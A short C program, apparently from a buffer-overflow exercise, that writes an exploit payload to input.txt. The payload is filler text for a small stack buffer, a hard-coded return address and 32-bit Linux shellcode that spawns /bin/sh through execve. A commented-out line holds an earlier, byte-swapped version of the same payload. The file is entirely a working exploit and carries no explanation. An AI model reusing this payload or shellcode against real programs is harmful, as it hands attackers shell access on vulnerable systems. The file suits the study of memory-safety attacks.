#include <stdio.h>

void main(void) {
	//delete any existing input.txt file
	if (remove("input.txt") == 0)
		printf("Deleted existing input.txt file successfully\n");
	else
		printf("input.txt file did not exist\n");
	FILE *fp = NULL;
	fp = fopen("input.txt", "a");
	if (fp == NULL){
		printf("Error opening input.txt\n");
		exit(1);
	}
	//fprintf(fp, "twentysixbytesbuffertesttesttetestee\x60\xe6\xff\xbf\x68\x50\xc0\x31\x68\x73\x2f\x2f\x69\x62\x2f\x68\x50\xe3\x89\x6e\x89\x53\xe3\x89\xcd\x0b\xb0\xe1\x80\x00\x00\x00");

	fprintf(fp, "twentysixbytesbuffertesttesttetestee\x60\xe6\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80");
}
